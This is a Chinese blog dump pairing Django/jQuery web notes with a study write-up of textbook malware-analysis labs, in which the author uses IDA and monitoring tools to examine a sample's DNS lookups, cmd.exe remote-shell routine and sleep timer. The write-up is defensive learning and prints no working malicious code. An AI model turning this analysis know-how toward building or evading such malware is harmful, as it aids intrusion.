class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">def lrem(self, name: str, coun<span class="hljs-variable">t:</span> <span class="hljs-keyword">int</span>, value: str) -&gt; Union[Awaitable[<span class="hljs-keyword">int</span>], <span class="hljs-keyword">int</span>]:<br>    <span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br>    Remove the <span class="hljs-keyword">first</span> ``<span class="hljs-built_in">count</span>`` occurrences of elements equal <span class="hljs-keyword">to</span> ``value``<br>    from the <span class="hljs-keyword">list</span> stored at ``name``.<br><br>    The <span class="hljs-built_in">count</span> <span class="hljs-keyword">argument</span> influences the operation in the following way<span class="hljs-variable">s:</span><br>        <span class="hljs-built_in">count</span> &gt; <span class="hljs-number">0</span>: Remove elements equal <span class="hljs-keyword">to</span> value moving from head <span class="hljs-keyword">to</span> tail.<br>        <span class="hljs-built_in">count</span> &lt; <span class="hljs-number">0</span>: Remove elements equal <span class="hljs-keyword">to</span> value moving from tail <span class="hljs-keyword">to</span> head.<br>        <span class="hljs-built_in">count</span> = <span class="hljs-number">0</span>: Remove <span class="hljs-keyword">all</span> elements equal <span class="hljs-keyword">to</span> value.<br></code></pre></td></tr></table></figure><h1 id="前端form表单"><a class="markdownIt-Anchor" href="#前端form表单"></a> 前端form表单</h1><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/pagetest/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span></span><br><span class="xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span></span><br><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">searchshow</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">searchshow</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;search&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control input-lg&quot;</span>&gt;</span></span><br><span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-btn&quot;</span>&gt;</span></span><br><span class="xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-lg btn-primary&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><br><span class="xml">                            搜索</span><br><span class="xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h1 id="前端js-get请求-jquery"><a class="markdownIt-Anchor" href="#前端js-get请求-jquery"></a> 前端js get请求 jquery</h1><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs lua">&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deletePost</span><span class="hljs-params">()</span></span>&#123;<br>            $.ajax(&#123;<br>            <span class="hljs-built_in">type</span>:<span class="hljs-string">&quot;GET&quot;</span>,<br>            url:<span class="hljs-string">&quot;/../stoptask/&quot;</span>,<br>            data:&#123;<span class="hljs-string">&quot;taskname&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;taskname&#125;&#125;&quot;</span>&#125;,<br>            async:<span class="hljs-literal">true</span>,<br>            cache:<span class="hljs-literal">true</span>,<br>            dataType:<span class="hljs-string">&quot;text&quot;</span>,<br>            success:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(backdata,status,xmlHttpRequest)</span></span> &#123;<br>                swal(<span class="hljs-string">&quot;服务器返回的数据&quot;</span>+backdata+<span class="hljs-string">&quot;\n服务器响应的状态&quot;</span>+<span class="hljs-built_in">status</span>+<span class="hljs-string">&quot;\n服务器请求&quot;</span>+xmlHttpRequest+<span class="hljs-string">&quot;\n状态码&quot;</span>+xmlHttpRequest.<span class="hljs-built_in">status</span>+<span class="hljs-string">&quot;\nresponseText:&quot;</span>+xmlHttpRequest.responseText,<span class="hljs-string">&#x27;success&#x27;</span>);<br>            &#125;,<br>            <span class="hljs-built_in">error</span>:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(msg)</span></span> &#123;<br>                alert(<span class="hljs-string">&quot;错误内容&quot;</span>+msg)<br>            &#125;<br>        &#125;);<br><br><br>&#125;<br><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>点击按钮事件</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;modal-footer&quot;</span> onclick=<span class="hljs-string">&quot;deletePost()&quot;</span>&gt;<br>  &lt;button type=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> data-dismiss=<span class="hljs-string">&quot;modal&quot;</span>&gt;返回&lt;/button&gt;<br>  &lt;button type=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span> data-dismiss=<span class="hljs-string">&quot;modal&quot;</span>  <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;btnOkDelete&quot;</span>&gt;确认&lt;/button&gt;<br>&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><h1 id="swal-sweetalertjs使用"><a class="markdownIt-Anchor" href="#swal-sweetalertjs使用"></a> swal sweetalert.js使用</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//弹出框提醒</span><br>swal(&#123;<br>  title: <span class="hljs-string">&quot;111&quot;</span>,<br>  text: <span class="hljs-string">&quot;111...&quot;</span>,<br>  icon: <span class="hljs-string">&quot;success&quot;</span>,<br>  buttons: <span class="hljs-literal">false</span>,<br>  timer: <span class="hljs-number">4000</span>,<br>&#125;);<br><span class="hljs-comment">//动画过渡完跳转</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-built_in">window</span>.location.href=<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;,<span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><h1 id="删除-django-数据"><a class="markdownIt-Anchor" href="#删除-django-数据"></a> 删除  django 数据</h1><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">delete_tag = <span class="hljs-keyword">tag</span>.<span class="hljs-built_in">filter</span>(tagergetname=tagname)<br>delete_tag.<span class="hljs-keyword">delete</span>()<br></code></pre></td></tr></table></figure><h1 id="django-queryset-类型转字典"><a class="markdownIt-Anchor" href="#django-queryset-类型转字典"></a> django QuerySet 类型转字典</h1><p><a href="https://www.jianshu.com/p/6d63df9d2ac4">QuerySet 类型转字典 - 简书 (jianshu.com)</a></p><h1 id="django-登录用户鉴权"><a class="markdownIt-Anchor" href="#django-登录用户鉴权"></a> django 登录用户/鉴权</h1><p>在需要登录的视图加这个装饰器，/login是登录使用的url，需要再写一个视图函数</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-meta">@login</span>_<span class="hljs-keyword">required</span>(login_url=<span class="hljs-string">&quot;/login&quot;</span>)<br></code></pre></td></tr></table></figure><p>在视图界面导入这些库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> django.contrib.auth <span class="hljs-keyword">import</span> authenticate, <span class="hljs-keyword">login</span>, logout<br><span class="hljs-keyword">from</span> django.core.paginator <span class="hljs-keyword">import</span> Paginator<br><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render, redirect, <span class="hljs-keyword">reverse</span><br><span class="hljs-keyword">from</span> django.contrib.auth.decorators <span class="hljs-keyword">import</span> login_required<br></code></pre></td></tr></table></figure><p><strong>request.user.is_authenticated</strong>可以获取当前是否登录了用户，可以<strong>先看看是否已经算登录了用户</strong>，被坑过</p><p><strong>模板获取登录用户</strong></p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml"> </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> user.is_authenticated %&#125;</span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav navbar-top-links navbar-right&quot;</span>&gt;</span></span><br><span class="xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span></span><br><span class="xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/loginout&quot;</span>&gt;</span></span><br><span class="xml">                                    <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-sign-out&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> 登出用户 </span><span class="hljs-template-variable">&#123;&#123; user.get_username &#125;&#125;</span><br><span class="xml">                                <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="xml">                            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="如何通过js获取输入框内容"><a class="markdownIt-Anchor" href="#如何通过js获取输入框内容"></a> 如何通过js获取输入框内容</h1><p>例如我们页面上定义了一个输入框：</p><p><code>&lt;input type=&quot;text&quot; name=&quot;message&quot; id=&quot;message&quot; placeholder=&quot;请输入&quot; /&gt;</code></p><p><strong>JavaScript：</strong><br><code>var value = document.getElementById(&quot;message&quot;).value</code></p><p><strong>jQuery:</strong><br><code>var value = $('#message').val();</code></p><p>原文链接：<a href="https://blog.csdn.net/qq_22331931/article/details/105210289">https://blog.csdn.net/qq_22331931/article/details/105210289</a></p><h1 id="django-批量更新数据"><a class="markdownIt-Anchor" href="#django-批量更新数据"></a> django 批量更新数据</h1><p>使用bulk_update()方法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> ipinfovar <span class="hljs-keyword">in</span> ipinfotest:<br>ipinfovar<span class="hljs-selector-class">.assettag</span> = assettag<br><span class="hljs-selector-id">#ipinfotest</span> = list(ipinfotest)<br><span class="hljs-selector-id">#ipinfoupdata</span> = <span class="hljs-selector-attr">[ ipinfovar.assettag = assettag for ipinfovar in ipinfotest]</span><br><span class="hljs-selector-id">#ipinfoupdata</span> = ipinfotest<span class="hljs-selector-class">.create</span>(assettag=assettag)<br>ipinfo<span class="hljs-selector-class">.objects</span><span class="hljs-selector-class">.bulk_update</span>(ipinfotest,<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;assettag&#x27;</span>]</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析lab-3，lab-5</title>
    <link href="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/"/>
    <url>/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/</url>
    
    <content type="html"><![CDATA[<h1 id="lab3-1"><a class="markdownIt-Anchor" href="#lab3-1"></a> lab3-1</h1><p>peid打开，发现程序是加壳的，其实好像前面的章节不要求脱壳，而且这是动态分析章，所以就先不脱了</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220417205127511.png" alt="image-20220417205127511" style="zoom: 67%;"><p>ida分析，可疑的字符串如下</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220417205351590.png" alt="image-20220417205351590" style="zoom:67%;"><p>使用<strong>processmonitor</strong>，添加过滤器，把字符串中的<strong>vmx32to64.exe</strong>这个名称和<strong>lab03-01.exe</strong>添加进去</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220417205901834.png" alt="image-20220417205901834" style="zoom:67%;"><p>使用<strong>ApateDns</strong>检测dns行为</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220417210845951.png" alt="image-20220417210845951" style="zoom: 67%;"><p>用<strong>regshot</strong>拍摄注册表快照</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220417211422396.png" alt="image-20220417211422396" style="zoom:67%;"><p>不过我这里程序没有启动成功。。。。</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220417212056777.png" alt="image-20220417212056777" style="zoom:50%;"><p>但是能看到一些操作，因为没运行成功也没看到最后有没有那个exe。。。</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220417212346286.png" alt="image-20220417212346286" style="zoom:67%;"><h1 id="lab3-2-dll"><a class="markdownIt-Anchor" href="#lab3-2-dll"></a> lab3-2 dll</h1><p>题目中要求让其自行安装，观察其导出表有类似名字为install的函数，据说是需要使用rundll32 ，加载</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220417213338471.png" alt="image-20220417213338471" style="zoom:67%;"><h1 id="lab-5-1"><a class="markdownIt-Anchor" href="#lab-5-1"></a> lab 5 -1</h1><h2 id="1ida打开处即是dllmain"><a class="markdownIt-Anchor" href="#1ida打开处即是dllmain"></a> 1.ida打开处即是dllmain</h2><p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220424235620166.png" alt="image-20220424235620166"></p><h2 id="2使用imports窗口并浏览到gethostbyname-导入函数定位到什么地址"><a class="markdownIt-Anchor" href="#2使用imports窗口并浏览到gethostbyname-导入函数定位到什么地址"></a> 2.使用Imports窗口并浏览到gethostbyname, 导入函数定位到什么地址？</h2><p>在import窗口可以进行CTRL+F搜索</p><p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220425000515069.png" alt="image-20220425000515069"></p><h2 id="3有多少函数调用了gethostbyname"><a class="markdownIt-Anchor" href="#3有多少函数调用了gethostbyname"></a> 3.有多少函数调用了gethostbyname?</h2><p>对这个函数右键，选择Jump to xref operand，可以看到这个表，r代表读取函数，p代表引用</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220425000647035.png" alt="image-20220425000647035" style="zoom:67%;"><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220425000746391.png" alt="image-20220425000746391" style="zoom:80%;"><h2 id="4将精力集中在位于0x10001757处的对gethostbyname的调用你能找出那个dns请求将被触发吗"><a class="markdownIt-Anchor" href="#4将精力集中在位于0x10001757处的对gethostbyname的调用你能找出那个dns请求将被触发吗"></a> 4.将精力集中在位于0x10001757处的对gethostbyname的调用，你能找出那个DNS请求将被触发吗？</h2><p>用<strong>G键</strong>，可以直接跳转到对应地址</p><p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220425001820012.png" alt="image-20220425001820012"></p><p>这里先push了eax，然后调用函数，这里的off_10019040是字符串指针（指向这个字符串起始地址），然后加上13（dh），就刚好到p的位置</p><p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220425002427941.png" alt="image-20220425002427941"></p><p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220425002937272.png" alt="image-20220425002937272"></p><h2 id="5ida-pro识别了在0x10001656处的子过程中的多少个局部变量"><a class="markdownIt-Anchor" href="#5ida-pro识别了在0x10001656处的子过程中的多少个局部变量"></a> 5.IDA Pro识别了在0x10001656处的子过程中的多少个局部变量？</h2><p>G键跳转此地址，可以看到有差不多23个局部变量</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220425003137134.png" alt="image-20220425003137134" style="zoom:67%;"><h2 id="6ida-pro识别了在0x10001656处的子过程中的多少个参数"><a class="markdownIt-Anchor" href="#6ida-pro识别了在0x10001656处的子过程中的多少个参数"></a> 6.IDA Pro识别了在0x10001656处的子过程中的多少个参数？</h2><p>同上，可以看到有一个<strong>lpThreadParameter</strong>参数</p><h2 id="7使用strings窗口来在反汇编中定位字符串cmdexe-c-它位于哪"><a class="markdownIt-Anchor" href="#7使用strings窗口来在反汇编中定位字符串cmdexe-c-它位于哪"></a> 7.使用Strings窗口，来在反汇编中定位字符串\cmd.exe /c。 它位于哪？</h2><p>shift+f12 用字符串窗口 CTRL+ F查看</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220425003348521.png" alt="image-20220425003348521" style="zoom:67%;"><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220425003458480.png" alt="image-20220425003458480" style="zoom:67%;"><h2 id="8在引用cmdexe-c的代码所在的区域发生了什么"><a class="markdownIt-Anchor" href="#8在引用cmdexe-c的代码所在的区域发生了什么"></a> 8.在引用\cmd.exe /c的代码所在的区域发生了什么？</h2><p>转到调用\cmd.exe /的函数，上面会打印这段话，猜测可能是远程执行shell的函数</p><p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220425004248821.png" alt="image-20220425004248821"></p><h2 id="9在同样的区域在0x100101c8处看起来好像dword_1008e5c4是一个全局变量它帮助决定走哪条路径-那恶意代码是如何设置dword_1008e5c4的呢提示使用dword_1008e5c4的交叉引用"><a class="markdownIt-Anchor" href="#9在同样的区域在0x100101c8处看起来好像dword_1008e5c4是一个全局变量它帮助决定走哪条路径-那恶意代码是如何设置dword_1008e5c4的呢提示使用dword_1008e5c4的交叉引用"></a> 9.在同样的区域，在0x100101C8处，看起来好像dword_1008E5C4是一个全局变量，它帮助决定走哪条路径。那恶意代码是如何设置dword_1008E5C4的呢？（提示：使用dword_1008E5C4的交叉引用。）</h2><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220425004426252.png" alt="image-20220425004426252" style="zoom:67%;"><p>w表示写入，点进去第一处看到，eax的值写入到了这个位置，在这之前调用了sub_10003695函数</p><p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426012130096.png" alt="image-20220426012130096"></p><p>跟进去函数可以看到，返回之前有</p><p><strong>cmp     [ebp+VersionInformation.dwPlatformId], 2</strong></p><p><strong>setz    al</strong></p><p>这两个操作</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426012032565.png" alt="image-20220426012032565" style="zoom:80%;"><p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426012606122.png" alt="image-20220426012606122"></p><p>根据https://blog.csdn.net/m0_37442062/article/details/116423682的解释</p><p>dwPlatformId与2进行比较确定设置AL寄存器。2代表VER_PLATFORM_WIN32_NT，如果这里相等，则AL寄存器将被置位。<br>setz：当ZF标志被设定时，AL寄存器设1<br>所以sub_10003694的返回值是1,最后的dword_1008E5C4的值就被赋成了1,所以这个全局变量在程序运行的时候一直保持的是1</p><h1 id="10在位于0x1000ff58处的子过程中的几百行指令中一系列使用memecmp来比较字符串的比较-如果对robotwork的字符串比较是成功的当memcmp返回0会发生什么"><a class="markdownIt-Anchor" href="#10在位于0x1000ff58处的子过程中的几百行指令中一系列使用memecmp来比较字符串的比较-如果对robotwork的字符串比较是成功的当memcmp返回0会发生什么"></a> 10.在位于0x1000FF58处的子过程中的几百行指令中，一系列使用memecmp来比较字符串的比较。如果对robotwork的字符串比较是成功的（当memcmp返回0），会发生什么？</h1><p>比较成功后会调用sub_100052A2函数</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426013143164.png" alt="image-20220426013143164" style="zoom:67%;"><p>按汇编来说就是把调用memcmp，之后add esp 0ch，栈顶+12，等于释放12个字节的空间，然后test eax eax，如果返回为0，则不跳转jnz的地址</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426014612897.png" alt="image-20220426014612897" style="zoom:50%;"><h1 id="11pslist导出函数做了什么"><a class="markdownIt-Anchor" href="#11pslist导出函数做了什么"></a> 11.PSLIST导出函数做了什么？</h1><p>在导出函数窗口里找到该函数</p><p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426231954637.png" alt="image-20220426231954637"></p><p>首先调用了sub_100036c3函数</p><p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426232057235.png" alt="image-20220426232057235"></p><p>获取了系统版本，如果VersionInformation.dwPlatformId == 2 &amp;&amp; VersionInformation.dwMajorVersion &gt;= 5则返回ture</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426232528820.png" alt="image-20220426232528820" style="zoom:67%;"><h1 id="12使用图模式来绘制出对sub_10004e79的交叉引用图-当进入这个函数时那个api函数可能被调用仅仅基于这些api函数你会如何重命名这个函数"><a class="markdownIt-Anchor" href="#12使用图模式来绘制出对sub_10004e79的交叉引用图-当进入这个函数时那个api函数可能被调用仅仅基于这些api函数你会如何重命名这个函数"></a> 12.使用图模式来绘制出对sub_10004E79的交叉引用图。当进入这个函数时，那个API函数可能被调用？仅仅基于这些API函数，你会如何重命名这个函数？</h1><p>在view-a里g跳转到这个函数，然后右键xref graph from</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426234008189.png" alt="image-20220426234008189" style="zoom: 67%;"><p>然后就可以看到这个函数的调用图</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426234133634.png" alt="image-20220426234133634" style="zoom:67%;"><p>这里可以看到GetSystemDefaultLangID函数，貌似是获取系统的默认语言，然后还有send，malloc，free，感觉像是发送系统默认语言信息的函数</p><h1 id="13dllmain直接调用了多少个windows-api-多少个在深度为2时被调用"><a class="markdownIt-Anchor" href="#13dllmain直接调用了多少个windows-api-多少个在深度为2时被调用"></a> 13.DLLMain直接调用了多少个Windows API？ 多少个在深度为2时被调用？</h1><p>如果没找到视图的选项可以右键工具栏打开</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426234703456.png" alt="image-20220426234703456" style="zoom:67%;"><p>选最右边这个，深度选择1，然后创建</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426234828507.png" alt="image-20220426234828507" style="zoom:67%;"><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426235133333.png" alt="image-20220426235133333" style="zoom:67%;"><p>深度2同理，调用的函数太多了我就不放了</p><h1 id="14在0x10001358处有一个对sleep一个使用一个包含要睡眠的毫秒数的参数的api函数的调用-顺着代码向后看如果这段代码执行这个程序会睡眠多久"><a class="markdownIt-Anchor" href="#14在0x10001358处有一个对sleep一个使用一个包含要睡眠的毫秒数的参数的api函数的调用-顺着代码向后看如果这段代码执行这个程序会睡眠多久"></a> 14.在0x10001358处，有一个对Sleep（一个使用一个包含要睡眠的毫秒数的参数的API函数）的调用。顺着代码向后看，如果这段代码执行，这个程序会睡眠多久？</h1><p>g跳转到这个地址，可以看到参数是v16*1000，v16又是v16 = atoi(off_10019020[0] + 13);得来的</p><img src="/2022/04/20/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90lab-3%EF%BC%8Clab-5/image-20220426235357429.png" alt="image-20220426235357429" style="zoom:67%;"><p>进去off_10019020，可以看到这个字符串加13的位置就是30，所以v16就是30，sleep的参数就是30*1000毫秒<img 